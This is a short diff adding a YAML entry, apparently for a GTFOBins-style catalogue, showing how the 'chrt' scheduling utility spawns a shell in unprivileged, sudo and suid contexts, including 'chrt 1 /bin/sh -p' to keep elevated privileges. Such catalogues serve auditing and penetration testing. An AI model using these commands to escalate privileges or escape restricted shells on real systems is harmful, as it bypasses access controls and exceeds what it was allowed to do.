@@ -1,0 +1,15 @@
+---
+functions:
+  shell:
+  - code: |-
+      chrt 1 /bin/sh
+    comment: |-
+      Any number between 1 and 99 will do.
+    contexts:
+      sudo:
+      suid:
+        code: |-
+          chrt 1 /bin/sh -p
+        shell: false
+      unprivileged:
+...
